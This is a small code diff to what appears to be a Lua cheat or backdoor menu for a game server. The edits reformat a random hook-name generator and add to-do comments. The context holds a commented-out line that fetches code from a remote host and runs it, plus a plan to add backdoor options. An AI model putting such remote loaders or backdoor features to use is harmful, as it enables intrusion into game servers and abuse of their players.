@@ -4,9 +4,12 @@ local wtf = {
 
 function wtf.gString()
     local s = ""
+
     for i = 1, math.random(10, 220) do
-    s = s.. string.char(math.random(32, 126))
-end return s
+        s = s .. string.char(math.random(32, 126))
+    end 
+
+    return s
 end
 
 local PhyRainbowHook, FlashSpamHook, UseSpamHook = wtf.gString(), wtf.gString(), wtf.gString()
@@ -1804,3 +1807,5 @@ CreateSoundButtons()
 --/ http.Fetch("https://w0rst.xyz/script/load", RunString)
 --# ADD PASTED REBUG BACKDOOR OPTIONS
 --# CREATE NEW COLOR SLIDERS
+--# add serverside call check
+--# password check inside net add function
